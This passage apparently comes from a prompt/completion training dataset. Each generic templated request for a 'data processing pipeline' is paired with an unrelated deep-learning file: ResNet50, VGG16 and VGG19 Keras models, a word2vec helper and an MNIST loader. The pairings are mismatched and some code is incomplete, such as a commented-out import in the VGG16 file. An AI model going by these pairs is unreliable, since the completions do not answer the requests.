BatchNormalization(axis=bn_axis, name=bn_name_base + '2b')(x)\n    x = Activation('relu')(x)\n\n    x = Convolution2D(nb_filter3, 1, 1, name=conv_name_base + '2c')(x)\n    x = BatchNormalization(axis=bn_axis, name=bn_name_base + '2c')(x)\n\n    x = merge([x, input_tensor], mode='sum')\n    x = Activation('relu')(x)\n    return x\n\n\ndef conv_block(input_tensor, kernel_size, filters, stage, block, strides=(2, 2)):\n    '''conv_block is the block that has a conv layer at shortcut\n\n    # Arguments\n        input_tensor: input tensor\n        kernel_size: defualt 3, the kernel size of middle conv layer at main path\n        filters: list of integers, the nb_filters of 3 conv layer at main path\n        stage: integer, current stage label, used for generating layer names\n        block: 'a','b'..., current block label, used for generating layer names\n\n    Note that from stage 3, the first conv layer at main path is with subsample=(2,2)\n    And the shortcut should have subsample=(2,2) as well\n    '''\n    nb_filter1, nb_filter2, nb_filter3 = filters\n    if K.image_dim_ordering() == 'tf':\n        bn_axis = 3\n    else:\n        bn_axis = 1\n    conv_name_base = 'res' + str(stage) + block + '_branch'\n    bn_name_base = 'bn' + str(stage) + block + '_branch'\n\n    x = Convolution2D(nb_filter1, 1, 1, subsample=strides,\n                      name=conv_name_base + '2a')(input_tensor)\n    x = BatchNormalization(axis=bn_axis, name=bn_name_base + '2a')(x)\n    x = Activation('relu')(x)\n\n    x = Convolution2D(nb_filter2, kernel_size, kernel_size, border_mode='same',\n                      name=conv_name_base + '2b')(x)\n    x = BatchNormalization(axis=bn_axis, name=bn_name_base + '2b')(x)\n    x = Activation('relu')(x)\n\n    x = Convolution2D(nb_filter3, 1, 1, name=conv_name_base + '2c')(x)\n    x = BatchNormalization(axis=bn_axis, name=bn_name_base + '2c')(x)\n\n    shortcut = Convolution2D(nb_filter3, 1, 1, subsample=strides,\n                             name=conv_name_base + '1')(input_tensor)\n    shortcut = BatchNormalization(axis=bn_axis, name=bn_name_base + '1')(shortcut)\n\n    x = merge([x, shortcut], mode='sum')\n    x = Activation('relu')(x)\n    return x\n\n\ndef ResNet50(include_top=True, weights='imagenet',\n             input_tensor=None):\n    '''Instantiate the ResNet50 architecture,\n    optionally loading weights pre-trained\n    on ImageNet. Note that when using TensorFlow,\n    for best performance you should set\n    `image_dim_ordering=\"tf\"` in your Keras config\n    at ~/.keras/keras.json.\n\n    The model and the weights are compatible with both\n    TensorFlow and Theano. The dimension ordering\n    convention used by the model is the one\n    specified in your Keras config file.\n\n    # Arguments\n        include_top: whether to include the 3 fully-connected\n            layers at the top of the network.\n        weights: one of `None` (random initialization)\n            or \"imagenet\" (pre-training on ImageNet).\n        input_tensor: optional Keras tensor (i.e. xput of `layers.Input()`)\n            to use as image input for the model.\n\n    # Returns\n        A Keras model instance.\n    '''\n    if weights not in {'imagenet', None}:\n        raise ValueError('The `weights` argument should be either '\n                         '`None` (random initialization) or `imagenet` '\n                         '(pre-training on ImageNet).')\n    # Determine proper input shape\n    if K.image_dim_ordering() == 'th':\n        if include_top:\n            input_shape = (3, 224, 224)\n        else:\n            input_shape = (3, None, None)\n    else:\n        if include_top:\n            input_shape = (224, 224, 3)\n        else:\n            input_shape = (None, None, 3)\n\n    if input_tensor is None:\n        img_input = Input(shape=input_shape)\n    else:\n        if not K.is_keras_tensor(input_tensor):\n            img_input = Input(tensor=input_tensor)\n        else:\n            img_input = input_tensor\n    if K.image_dim_ordering() == 'tf':\n        bn_axis = 3\n    else:\n        bn_axis = 1\n\n    x = ZeroPadding2D((3, 3))(img_input)\n    x = Convolution2D(64, 7, 7, subsample=(2, 2), name='conv1')(x)\n    x = BatchNormalization(axis=bn_axis, name='bn_conv1')(x)\n    x = Activation('relu')(x)\n    x = MaxPooling2D((3, 3), strides=(2, 2))(x)\n\n    x = conv_block(x, 3, [64, 64, 256], stage=2, block='a', strides=(1, 1))\n    x = identity_block(x, 3, [64, 64, 256], stage=2, block='b')\n    x = identity_block(x, 3, [64, 64, 256], stage=2, block='c')\n\n    x = conv_block(x, 3, [128, 128, 512], stage=3, block='a')\n    x = identity_block(x, 3, [128, 128, 512], stage=3, block='b')\n    x = identity_block(x, 3, [128, 128, 512], stage=3, block='c')\n    x = identity_block(x, 3, [128, 128, 512], stage=3, block='d')\n\n    x = conv_block(x, 3, [256, 256, 1024], stage=4, block='a')\n    x = identity_block(x, 3, [256, 256, 1024], stage=4, block='b')\n    x = identity_block(x, 3, [256, 256, 1024], stage=4, block='c')\n    x = identity_block(x, 3, [256, 256, 1024], stage=4, block='d')\n    x = identity_block(x, 3, [256, 256, 1024], stage=4, block='e')\n    x = identity_block(x, 3, [256, 256, 1024], stage=4, block='f')\n\n    x = conv_block(x, 3, [512, 512, 2048], stage=5, block='a')\n    x = identity_block(x, 3, [512, 512, 2048], stage=5, block='b')\n    x = identity_block(x, 3, [512, 512, 2048], stage=5, block='c')\n\n    x = AveragePooling2D((7, 7), name='avg_pool')(x)\n\n    if include_top:\n        x = Flatten()(x)\n        x = Dense(1000, activation='softmax', name='fc1000')(x)\n\n    model = Model(img_input, x)\n\n    # load weights\n    if weights == 'imagenet':\n        print('K.image_dim_ordering:', K.image_dim_ordering())\n        if K.image_dim_ordering() == 'th':\n            if include_top:\n                weights_path = get_file('resnet50_weights_th_dim_ordering_th_kernels.h5',\n                                        TH_WEIGHTS_PATH,\n                                        cache_subdir='models')\n            else:\n                weights_path = get_file('resnet50_weights_th_dim_ordering_th_kernels_notop.h5',\n                                        TH_WEIGHTS_PATH_NO_TOP,\n                                        cache_subdir='models')\n            model.load_weights(weights_path)\n            if K.backend() == 'tensorflow':\n                warnings.warn('You are using the TensorFlow backend, yet you '\n                              'are using the Theano '\n                              'image dimension ordering convention '\n                              '(`image_dim_ordering=\"th\"`). '\n                              'For best performance, set '\n                              '`image_dim_ordering=\"tf\"` in '\n                              'your Keras config '\n                              'at ~/.keras/keras.json.')\n                convert_all_kernels_in_model(model)\n        else:\n            if include_top:\n                weights_path = get_file('resnet50_weights_tf_dim_ordering_tf_kernels.h5',\n                                        TF_WEIGHTS_PATH,\n                                        cache_subdir='models')\n            else:\n                weights_path = get_file('resnet50_weights_tf_dim_ordering_tf_kernels_notop.h5',\n                                        TF_WEIGHTS_PATH_NO_TOP,\n                                        cache_subdir='models')\n            model.load_weights(weights_path)\n            if K.backend() == 'theano':\n                convert_all_kernels_in_model(model)\n    return model\n\n\nif __name__ == '__main__':\n    model = ResNet50(include_top=True, weights='imagenet')\n\n    img_path = 'elephant.jpg'\n    img = image.load_img(img_path, target_size=(224, 224))\n    x = image.img_to_array(img)\n    x = np.expand_dims(x, axis=0)\n    x = preprocess_input(x)\n    print('Input image shape:', x.shape)\n\n    preds = model.predict(x)\n    print('Predicted:', decode_predictions(preds))\n", "metadata": {"source": "github.com/donnemartin/data-science-ipython-notebooks", "file_path": "deep-learning/keras-tutorial/deep_learning_models/resnet50.py", "language": "python", "complexity": "complex", "star_count": 28407, "quality_score": 0.9500000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# -*- coding: utf-8 -*-\n'''VGG16 model for Keras.\n\n# Reference:\n\n- [Very Deep Convolutional Networks for Large-Scale Image Recognition](https://arxiv.org/abs/1409.1556)\n\n'''\nfrom __future__ import print_function\n\nimport numpy as np\nimport warnings\n\nfrom keras.models import Model\nfrom keras.layers import Flatten, Dense, Input\nfrom keras.layers import Convolution2D, MaxPooling2D\nfrom keras.preprocessing import image\nfrom keras.utils.layer_utils import convert_all_kernels_in_model\nfrom keras.utils.data_utils import get_file\nfrom keras import backend as K\n# from imagenet_utils import decode_predictions, preprocess_input\n\n\nTH_WEIGHTS_PATH = 'https://github.com/fchollet/deep-learning-models/releases/download/v0.1/vgg16_weights_th_dim_ordering_th_kernels.h5'\nTF_WEIGHTS_PATH = 'https://github.com/fchollet/deep-learning-models/releases/download/v0.1/vgg16_weights_tf_dim_ordering_tf_kernels.h5'\nTH_WEIGHTS_PATH_NO_TOP = 'https://github.com/fchollet/deep-learning-models/releases/download/v0.1/vgg16_weights_th_dim_ordering_th_kernels_notop.h5'\nTF_WEIGHTS_PATH_NO_TOP = 'https://github.com/fchollet/deep-learning-models/releases/download/v0.1/vgg16_weights_tf_dim_ordering_tf_kernels_notop.h5'\n\n\ndef VGG16(include_top=True, weights='imagenet',\n          input_tensor=None):\n    '''Instantiate the VGG16 architecture,\n    optionally loading weights pre-trained\n    on ImageNet. Note that when using TensorFlow,\n    for best performance you should set\n    `image_dim_ordering=\"tf\"` in your Keras config\n    at ~/.keras/keras.json.\n\n    The model and the weights are compatible with both\n    TensorFlow and Theano. The dimension ordering\n    convention used by the model is the one\n    specified in your Keras config file.\n\n    # Arguments\n        include_top: whether to include the 3 fully-connected\n            layers at the top of the network.\n        weights: one of `None` (random initialization)\n            or \"imagenet\" (pre-training on ImageNet).\n        input_tensor: optional Keras tensor (i.e. output of `layers.Input()`)\n            to use as image input for the model.\n\n    # Returns\n        A Keras model instance.\n    '''\n    if weights not in {'imagenet', None}:\n        raise ValueError('The `weights` argument should be either '\n                         '`None` (random initialization) or `imagenet` '\n                         '(pre-training on ImageNet).')\n    # Determine proper input shape\n    if K.image_dim_ordering() == 'th':\n        if include_top:\n            input_shape = (3, 224, 224)\n        else:\n            input_shape = (3, None, None)\n    else:\n        if include_top:\n            input_shape = (224, 224, 3)\n        else:\n            input_shape = (None, None, 3)\n\n    if input_tensor is None:\n        img_input = Input(shape=input_shape)\n    else:\n        if not K.is_keras_tensor(input_tensor):\n            img_input = Input(tensor=input_tensor)\n        else:\n            img_input = input_tensor\n    # Block 1\n    x = Convolution2D(64, 3, 3, activation='relu', border_mode='same', name='block1_conv1')(img_input)\n    x = Convolution2D(64, 3, 3, activation='relu', border_mode='same', name='block1_conv2')(x)\n    x = MaxPooling2D((2, 2), strides=(2, 2), name='block1_pool')(x)\n\n    # Block 2\n    x = Convolution2D(128, 3, 3, activation='relu', border_mode='same', name='block2_conv1')(x)\n    x = Convolution2D(128, 3, 3, activation='relu', border_mode='same', name='block2_conv2')(x)\n    x = MaxPooling2D((2, 2), strides=(2, 2), name='block2_pool')(x)\n\n    # Block 3\n    x = Convolution2D(256, 3, 3, activation='relu', border_mode='same', name='block3_conv1')(x)\n    x = Convolution2D(256, 3, 3, activation='relu', border_mode='same', name='block3_conv2')(x)\n    x = Convolution2D(256, 3, 3, activation='relu', border_mode='same', name='block3_conv3')(x)\n    x = MaxPooling2D((2, 2), strides=(2, 2), name='block3_pool')(x)\n\n    # Block 4\n    x = Convolution2D(512, 3, 3, activation='relu', border_mode='same', name='block4_conv1')(x)\n    x = Convolution2D(512, 3, 3, activation='relu', border_mode='same', name='block4_conv2')(x)\n    x = Convolution2D(512, 3, 3, activation='relu', border_mode='same', name='block4_conv3')(x)\n    x = MaxPooling2D((2, 2), strides=(2, 2), name='block4_pool')(x)\n\n    # Block 5\n    x = Convolution2D(512, 3, 3, activation='relu', border_mode='same', name='block5_conv1')(x)\n    x = Convolution2D(512, 3, 3, activation='relu', border_mode='same', name='block5_conv2')(x)\n    x = Convolution2D(512, 3, 3, activation='relu', border_mode='same', name='block5_conv3')(x)\n    x = MaxPooling2D((2, 2), strides=(2, 2), name='block5_pool')(x)\n\n    if include_top:\n        # Classification block\n        x = Flatten(name='flatten')(x)\n        x = Dense(4096, activation='relu', name='fc1')(x)\n        x = Dense(4096, activation='relu', name='fc2')(x)\n        x = Dense(1000, activation='softmax', name='predictions')(x)\n\n    # Create model\n    model = Model(img_input, x)\n\n    # load weights\n    if weights == 'imagenet':\n        print('K.image_dim_ordering:', K.image_dim_ordering())\n        if K.image_dim_ordering() == 'th':\n            if include_top:\n                weights_path = get_file('vgg16_weights_th_dim_ordering_th_kernels.h5',\n                                        TH_WEIGHTS_PATH,\n                                        cache_subdir='models')\n            else:\n                weights_path = get_file('vgg16_weights_th_dim_ordering_th_kernels_notop.h5',\n                                        TH_WEIGHTS_PATH_NO_TOP,\n                                        cache_subdir='models')\n            model.load_weights(weights_path)\n            if K.backend() == 'tensorflow':\n                warnings.warn('You are using the TensorFlow backend, yet you '\n                              'are using the Theano '\n                              'image dimension ordering convention '\n                              '(`image_dim_ordering=\"th\"`). '\n                              'For best performance, set '\n                              '`image_dim_ordering=\"tf\"` in '\n                              'your Keras config '\n                              'at ~/.keras/keras.json.')\n                convert_all_kernels_in_model(model)\n        else:\n            if include_top:\n                weights_path = get_file('vgg16_weights_tf_dim_ordering_tf_kernels.h5',\n                                        TF_WEIGHTS_PATH,\n                                        cache_subdir='models')\n            else:\n                weights_path = get_file('vgg16_weights_tf_dim_ordering_tf_kernels_notop.h5',\n                                        TF_WEIGHTS_PATH_NO_TOP,\n                                        cache_subdir='models')\n            model.load_weights(weights_path)\n            if K.backend() == 'theano':\n                convert_all_kernels_in_model(model)\n    return model\n\n\nif __name__ == '__main__':\n    model = VGG16(include_top=True, weights='imagenet')\n\n    img_path = 'elephant.jpg'\n    img = image.load_img(img_path, target_size=(224, 224))\n    x = image.img_to_array(img)\n    x = np.expand_dims(x, axis=0)\n    x = preprocess_input(x)\n    print('Input image shape:', x.shape)\n\n    preds = model.predict(x)\n    print('Predicted:', decode_predictions(preds))\n", "metadata": {"source": "github.com/donnemartin/data-science-ipython-notebooks", "file_path": "deep-learning/keras-tutorial/deep_learning_models/vgg16.py", "language": "python", "complexity": "medium", "star_count": 28407, "quality_score": 0.9500000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# -*- coding: utf-8 -*-\n'''VGG19 model for Keras.\n\n# Reference:\n\n- [Very Deep Convolutional Networks for Large-Scale Image Recognition](https://arxiv.org/abs/1409.1556)\n\n'''\nfrom __future__ import print_function\n\nimport numpy as np\nimport warnings\n\nfrom keras.models import Model\nfrom keras.layers import Flatten, Dense, Input\nfrom keras.layers import Convolution2D, MaxPooling2D\nfrom keras.preprocessing import image\nfrom keras.utils.layer_utils import convert_all_kernels_in_model\nfrom keras.utils.data_utils import get_file\nfrom keras import backend as K\n\n\nTH_WEIGHTS_PATH = 'https://github.com/fchollet/deep-learning-models/releases/download/v0.1/vgg19_weights_th_dim_ordering_th_kernels.h5'\nTF_WEIGHTS_PATH = 'https://github.com/fchollet/deep-learning-models/releases/download/v0.1/vgg19_weights_tf_dim_ordering_tf_kernels.h5'\nTH_WEIGHTS_PATH_NO_TOP = 'https://github.com/fchollet/deep-learning-models/releases/download/v0.1/vgg19_weights_th_dim_ordering_th_kernels_notop.h5'\nTF_WEIGHTS_PATH_NO_TOP = 'https://github.com/fchollet/deep-learning-models/releases/download/v0.1/vgg19_weights_tf_dim_ordering_tf_kernels_notop.h5'\n\n\ndef VGG19(include_top=True, weights='imagenet',\n          input_tensor=None):\n    '''Instantiate the VGG19 architecture,\n    optionally loading weights pre-trained\n    on ImageNet. Note that when using TensorFlow,\n    for best performance you should set\n    `image_dim_ordering=\"tf\"` in your Keras config\n    at ~/.keras/keras.json.\n\n    The model and the weights are compatible with both\n    TensorFlow and Theano. The dimension ordering\n    convention used by the model is the one\n    specified in your Keras config file.\n\n    # Arguments\n        include_top: whether to include the 3 fully-connected\n            layers at the top of the network.\n        weights: one of `None` (random initialization)\n            or \"imagenet\" (pre-training on ImageNet).\n        input_tensor: optional Keras tensor (i.e. output of `layers.Input()`)\n            to use as image input for the model.\n\n    # Returns\n        A Keras model instance.\n    '''\n    if weights not in {'imagenet', None}:\n        raise ValueError('The `weights` argument should be either '\n                         '`None` (random initialization) or `imagenet` '\n                         '(pre-training on ImageNet).')\n    # Determine proper input shape\n    if K.image_dim_ordering() == 'th':\n        if include_top:\n            input_shape = (3, 224, 224)\n        else:\n            input_shape = (3, None, None)\n    else:\n        if include_top:\n            input_shape = (224, 224, 3)\n        else:\n            input_shape = (None, None, 3)\n\n    if input_tensor is None:\n        img_input = Input(shape=input_shape)\n    else:\n        if not K.is_keras_tensor(input_tensor):\n            img_input = Input(tensor=input_tensor)\n        else:\n            img_input = input_tensor\n    # Block 1\n    x = Convolution2D(64, 3, 3, activation='relu', border_mode='same', name='block1_conv1')(img_input)\n    x = Convolution2D(64, 3, 3, activation='relu', border_mode='same', name='block1_conv2')(x)\n    x = MaxPooling2D((2, 2), strides=(2, 2), name='block1_pool')(x)\n\n    # Block 2\n    x = Convolution2D(128, 3, 3, activation='relu', border_mode='same', name='block2_conv1')(x)\n    x = Convolution2D(128, 3, 3, activation='relu', border_mode='same', name='block2_conv2')(x)\n    x = MaxPooling2D((2, 2), strides=(2, 2), name='block2_pool')(x)\n\n    # Block 3\n    x = Convolution2D(256, 3, 3, activation='relu', border_mode='same', name='block3_conv1')(x)\n    x = Convolution2D(256, 3, 3, activation='relu', border_mode='same', name='block3_conv2')(x)\n    x = Convolution2D(256, 3, 3, activation='relu', border_mode='same', name='block3_conv3')(x)\n    x = Convolution2D(256, 3, 3, activation='relu', border_mode='same', name='block3_conv4')(x)\n    x = MaxPooling2D((2, 2), strides=(2, 2), name='block3_pool')(x)\n\n    # Block 4\n    x = Convolution2D(512, 3, 3, activation='relu', border_mode='same', name='block4_conv1')(x)\n    x = Convolution2D(512, 3, 3, activation='relu', border_mode='same', name='block4_conv2')(x)\n    x = Convolution2D(512, 3, 3, activation='relu', border_mode='same', name='block4_conv3')(x)\n    x = Convolution2D(512, 3, 3, activation='relu', border_mode='same', name='block4_conv4')(x)\n    x = MaxPooling2D((2, 2), strides=(2, 2), name='block4_pool')(x)\n\n    # Block 5\n    x = Convolution2D(512, 3, 3, activation='relu', border_mode='same', name='block5_conv1')(x)\n    x = Convolution2D(512, 3, 3, activation='relu', border_mode='same', name='block5_conv2')(x)\n    x = Convolution2D(512, 3, 3, activation='relu', border_mode='same', name='block5_conv3')(x)\n    x = Convolution2D(512, 3, 3, activation='relu', border_mode='same', name='block5_conv4')(x)\n    x = MaxPooling2D((2, 2), strides=(2, 2), name='block5_pool')(x)\n\n    if include_top:\n        # Classification block\n        x = Flatten(name='flatten')(x)\n        x = Dense(4096, activation='relu', name='fc1')(x)\n        x = Dense(4096, activation='relu', name='fc2')(x)\n        x = Dense(1000, activation='softmax', name='predictions')(x)\n\n    # Create model\n    model = Model(img_input, x)\n\n    # load weights\n    if weights == 'imagenet':\n        print('K.image_dim_ordering:', K.image_dim_ordering())\n        if K.image_dim_ordering() == 'th':\n            if include_top:\n                weights_path = get_file('vgg19_weights_th_dim_ordering_th_kernels.h5',\n                                        TH_WEIGHTS_PATH,\n                                        cache_subdir='models')\n            else:\n                weights_path = get_file('vgg19_weights_th_dim_ordering_th_kernels_notop.h5',\n                                        TH_WEIGHTS_PATH_NO_TOP,\n                                        cache_subdir='models')\n            model.load_weights(weights_path)\n            if K.backend() == 'tensorflow':\n                warnings.warn('You are using the TensorFlow backend, yet you '\n                              'are using the Theano '\n                              'image dimension ordering convention '\n                              '(`image_dim_ordering=\"th\"`). '\n                              'For best performance, set '\n                              '`image_dim_ordering=\"tf\"` in '\n                              'your Keras config '\n                              'at ~/.keras/keras.json.')\n                convert_all_kernels_in_model(model)\n        else:\n            if include_top:\n                weights_path = get_file('vgg19_weights_tf_dim_ordering_tf_kernels.h5',\n                                        TF_WEIGHTS_PATH,\n                                        cache_subdir='models')\n            else:\n                weights_path = get_file('vgg19_weights_tf_dim_ordering_tf_kernels_notop.h5',\n                                        TF_WEIGHTS_PATH_NO_TOP,\n                                        cache_subdir='models')\n            model.load_weights(weights_path)\n            if K.backend() == 'theano':\n                convert_all_kernels_in_model(model)\n    return model\n\n\nif __name__ == '__main__':\n    model = VGG19(include_top=True, weights='imagenet')\n\n    img_path = 'cat.jpg'\n    img = image.load_img(img_path, target_size=(224, 224))\n    x = image.img_to_array(img)\n    x = np.expand_dims(x, axis=0)\n    x = preprocess_input(x)\n    print('Input image shape:', x.shape)\n\n    preds = model.predict(x)\n    print('Predicted:', decode_predictions(preds))\n", "metadata": {"source": "github.com/donnemartin/data-science-ipython-notebooks", "file_path": "deep-learning/keras-tutorial/deep_learning_models/vgg19.py", "language": "python", "complexity": "medium", "star_count": 28407, "quality_score": 0.9500000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from gensim.models import word2vec\nfrom os.path import join, exists, split\nimport os\nimport numpy as np\n\ndef train_word2vec(sentence_matrix, vocabulary_inv,\n                   num_features=300, min_word_count=1, context=10):\n    \"\"\"\n    Trains, saves, loads Word2Vec model\n    Returns initial weights for embedding layer.\n   \n    inputs:\n    sentence_matrix # int matrix: num_sentences x max_sentence_len\n    vocabulary_inv  # dict {str:int}\n    num_features    # Word vector dimensionality                      \n    min_word_count  # Minimum word count                        \n    context         # Context window size \n    \"\"\"\n    model_dir = 'word2vec_models'\n    model_name = \"{:d}features_{:d}minwords_{:d}context\".format(num_features, min_word_count, context)\n    model_name = join(model_dir, model_name)\n    if exists(model_name):\n        embedding_model = word2vec.Word2Vec.load(model_name)\n        print('Loading existing Word2Vec model \\'%s\\'' % split(model_name)[-1])\n    else:\n        # Set values for various parameters\n        num_workers = 2       # Number of threads to run in parallel\n        downsampling = 1e-3   # Downsample setting for frequent words\n        \n        # Initialize and train the model\n        print(\"Training Word2Vec model...\")\n        sentences = [[vocabulary_inv[w] for w in s] for s in sentence_matrix]\n        embedding_model = word2vec.Word2Vec(sentences, workers=num_workers, \\\n                            size=num_features, min_count = min_word_count, \\\n                            window = context, sample = downsampling)\n        \n        # If we don't plan to train the model any further, calling \n        # init_sims will make the model much more memory-efficient.\n        embedding_model.init_sims(replace=True)\n        \n        # Saving the model for later use. You can load it later using Word2Vec.load()\n        if not exists(model_dir):\n            os.mkdir(model_dir)\n        print('Saving Word2Vec model \\'%s\\'' % split(model_name)[-1])\n        embedding_model.save(model_name)\n    \n    #  add unknown words\n    embedding_weights = [np.array([embedding_model[w] if w in embedding_model\\\n                                                        else np.random.uniform(-0.25,0.25,embedding_model.vector_size)\\\n                                                        for w in vocabulary_inv])]\n    return embedding_weights\n\nif __name__=='__main__':\n    import data_helpers\n    print(\"Loading data...\")\n    x, _, _, vocabulary_inv = data_helpers.load_data()\n    w = train_word2vec(x, vocabulary_inv)\n", "metadata": {"source": "github.com/donnemartin/data-science-ipython-notebooks", "file_path": "deep-learning/keras-tutorial/w2v.py", "language": "python", "complexity": "medium", "star_count": 28407, "quality_score": 0.92, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"Functions for downloading and reading MNIST data.\"\"\"\nfrom __future__ import print_function\nimport gzip\nimport os\nimport urllib\nimport numpy\nSOURCE_URL = 'http://yann.lecun.com/exdb/mnist/'\ndef maybe_download(filename, work_directory):\n  \"\"\"Download the data from Yann's website, unless it's already here.\"\"\"\n  if not os.path.exists(work_directory):\n    os.mkdir(work_directory)\n  filepath = os.path.join(work_directory, filename)\n  if not os.path.exists(filepath):\n    filepath, _ = urllib.urlretrieve(SOURCE_URL + filename, filepath)\n    statinfo = os.stat(filepath)\n    print('Succesfully downloaded', filename, statinfo.st_size, 'bytes.')\n  return filepath\ndef _read32(bytestream):\n  dt = numpy.dtype(numpy.uint32).newbyteorder('>')\n  return numpy.frombuffer(bytestream.read(4), dtype=dt)\ndef extract_images(filename):\n  \"\"\"Extract the images into a 4D uint8 numpy array [index, y, x, depth].\"\"\"\n  print('Extracting', filename)\n  with gzip.open(filename) as bytestream:\n    magic = _read32(bytestream)\n    if magic != 2051:\n      raise ValueError(\n          'Invalid magic number %d in MNIST image file: %s' %\n          (magic, filename))\n    num_images = _read32(bytestream)\n    rows = _read32(bytestream)\n    cols = _read32(bytestream)\n    buf = bytestream.read(rows * cols * num_images)\n    data = numpy.frombuffer(buf, dtype=numpy.uint8)\n    data = data.reshape(num_images, rows, cols, 1)\n    return data\ndef dense_to_one_hot(labels_dense, num_classes=10):\n  \"\"\"Convert class labels from scalars to one-hot vectors.\"\"\"\n  num_labels = labels_dense.shape[0]\n  index_offset = numpy.arange(num_labels) * num_classes\n  labels_one_hot = numpy.zeros((num_labels, num_classes))\n  labels_one_hot.flat[index_offset + labels_dense.ravel()] = 1\n  return labels_one_hot\ndef extract_labels(filename, one_hot=False):\n  \"\"\"Extract the labels into a 1D uint8 numpy array [index].\"\"\"\n  print('Extracting', filename)\n  with gzip.open(filename) as bytestream:\n    magic = _read32(bytestream)\n    if magic != 2049:\n      raise ValueError(\n          'Invalid magic number %d in MNIST label file: %s' %\n          (magic, filename))\n    num_items = _read32(bytestream)\n    buf = bytestream.read(num_items)\n    labels = numpy.frombuffer(buf, dtype=numpy.uint8)\n    if one_hot:\n      return dense_to_one_hot(labels)\n    return labels\nclass DataSet(object):\n  def __init__(self, images, labels, fake_data=False):\n    if fake_data:\n      self._num_examples = 10000\n    else:\n      assert images.shape[0] == labels.shape[0], (\n          \"images.shape: %s labels.shape: %s\" % (images.shape,\n                                                 labels.shape))\n      self._num_examples = images.shape[0]\n      # Convert shape from [num examples, rows, columns, depth]\n      # to [num examples, rows*columns] (assuming depth == 1)\n      assert images.shape[3] == 1\n      images = images.reshape(images.shape[0],\n                              images.shape[1] * images.shape[2])\n      # Convert from [0, 255] -> [0.0, 1.0].\n      images = images.astype(numpy.float32)\n      images = numpy.multiply(images, 1.0 / 255.0)\n    self._images = images\n    self._labels = labels\n    self._epochs_completed = 0\n    self._index_in_epoch = 0\n  @property\n  def images(self):\n    return self._images\n  @property\n  def labels(self):\n    return self._labels\n  @property\n  def num_examples(self):\n    return self._num_examples\n  @property\n  def epochs_completed(self):\n    return self._epochs_completed\n  def next_batch(self, batch_size, fake_data=False):\n    \"\"\"Return the next `batch_size` examples from this data set.\"\"\"\n    if fake_data:\n      fake_image = [1.0 for _ in xrange(784)]\n      fake_label = 0\n      return [fake_image for _ in xrange(batch_size)], [\n          fake_label for _ in xrange(batch_size)]\n    start = self._index_in_epoch\n    self._index_in_epoch += batch_size\n    if self._index_in_epoch > self._num_examples:\n      # Finished epoch\n      self._epochs_completed += 1\n      # Shuffle the data\n      perm = numpy.arange(self._num_examples)\n      numpy.random.shuffle(perm)\n      self._images = self._images[perm]\n      self._labels = self._labels[perm]\n      # Start next epoch\n      start = 0\n      self._index_in_epoch = batch_size\n      assert batch_size <= self._num_examples\n    end = self._index_in_epoch\n    return self._images[start:end], self._labels[start:end]\ndef read_data_sets(train_dir, fake_data=False, one_hot=False):\n  class DataSets(object):\n    pass\n  data_sets = DataSets()\n  if fake_data:\n    data_sets.train = DataSet([], [], fake_data=True)\n    data_sets.validation = DataSet([], [], fake_data=True)\n    data_sets.test = DataSet([], [], fake_data=True)\n    return data_sets\n  TRAIN_IMAGES = 'train-images-idx3-ubyte.gz'\n  TRAIN_LABELS = 'train-labels-idx1-ubyte.gz'\n  TEST_IMAGES = 't10k-images-idx3-ubyte.gz'\n  TEST_LABELS = 't10k-labels-idx1-ubyte.gz'\n  VALIDATION_SIZE = 5000\n  local_file = maybe_download(TRAIN_IMAGES, train_dir)\n  train_images = extract_images(local_file)\n  local_file = maybe_download(TRAIN_LABELS, train_dir)\n  train_labels = extract_labels(local_file, one_hot=one_hot)\n  local_file = maybe_download(TEST_IMAGES, train_dir)\n  test_images = extract_images(local_file)\n  local_file = maybe_download(TEST_LABELS, train_dir)\n  test_labels = extract_labels(local_file, one_hot=one_hot)\n  validation_images = train_images[:VALIDATION_SIZE]\n  validation_labels = train_labels[:VALIDATION_SIZE]\n  train_images = train_images[VALIDATION_SIZE:]\n  train_labels = train_labels[VALIDATION_SIZE:]\n  data_sets.train = DataSet(train_images, train_labels)\n  data_sets.validation = DataSet(validation_images, validation_labels)\n  data_sets.test = DataSet(test_images, test_labels)\n  return data_sets", "metadata": {"source": "github.com/donnemartin/data-science-ipython-notebooks", "file_path": "deep-learning/tensor-flow-examples/input_data.py", "language": "python", "complexity": "medium", "star_count": 28407, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
